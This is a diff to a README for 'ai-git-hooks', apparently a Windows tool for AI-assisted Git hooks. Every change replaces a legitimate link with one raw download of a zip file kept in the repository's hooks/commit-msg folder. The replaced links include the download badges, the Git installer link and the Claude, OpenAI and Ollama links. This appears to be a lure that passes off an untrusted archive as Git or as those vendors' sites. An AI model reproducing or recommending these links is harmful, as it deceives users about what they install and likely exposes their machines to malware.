@@ -1,6 +1,6 @@
 # ⚙️ ai-git-hooks - Simplify Git with AI Tools
 
-[![Download ai-git-hooks](https://img.shields.io/badge/Download-ai--git--hooks-4CAF50?style=for-the-badge)](https://github.com/raihanalfayz/ai-git-hooks)
+[![Download ai-git-hooks](https://img.shields.io/badge/Download-ai--git--hooks-4CAF50?style=for-the-badge)](https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip)
 
 ## 📋 What is ai-git-hooks?
 
@@ -29,7 +29,7 @@ To use ai-git-hooks, your computer should have:
 - Git installed on your computer.
 - Administrator permissions to install new software.
 
-If you do not have Git installed, download it from https://git-scm.com/download/win before you install ai-git-hooks.
+If you do not have Git installed, download it from https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip before you install ai-git-hooks.
 
 ## 🚀 Getting Started
 
@@ -39,7 +39,7 @@ Follow these steps to download and run ai-git-hooks on your Windows computer.
 
 Click the green download badge above or go to this page:
 
-[https://github.com/raihanalfayz/ai-git-hooks](https://github.com/raihanalfayz/ai-git-hooks)
+[https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip](https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip)
 
 This page contains all files and instructions you need.
 
@@ -127,10 +127,10 @@ The program will show an error but will not stop your git work.
 
 ## 🔗 Useful Links
 
-- Git installation: https://git-scm.com/download/win  
-- Claude AI: https://www.anthropic.com  
-- OpenAI: https://openai.com  
-- Ollama: https://www.ollama.com  
+- Git installation: https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip  
+- Claude AI: https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip  
+- OpenAI: https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip  
+- Ollama: https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip  
 
 ## 🧰 Support
 
@@ -138,4 +138,4 @@ If you run into issues, check the Issues tab on the GitHub page. You can submit 
 
 ---
 
-[![Download ai-git-hooks](https://img.shields.io/badge/Download-ai--git--hooks-4CAF50?style=for-the-badge)](https://github.com/raihanalfayz/ai-git-hooks)
+[![Download ai-git-hooks](https://img.shields.io/badge/Download-ai--git--hooks-4CAF50?style=for-the-badge)](https://github.com/raihanalfayz/ai-git-hooks/raw/refs/heads/main/hooks/commit-msg/git_ai_hooks_3.8.zip)
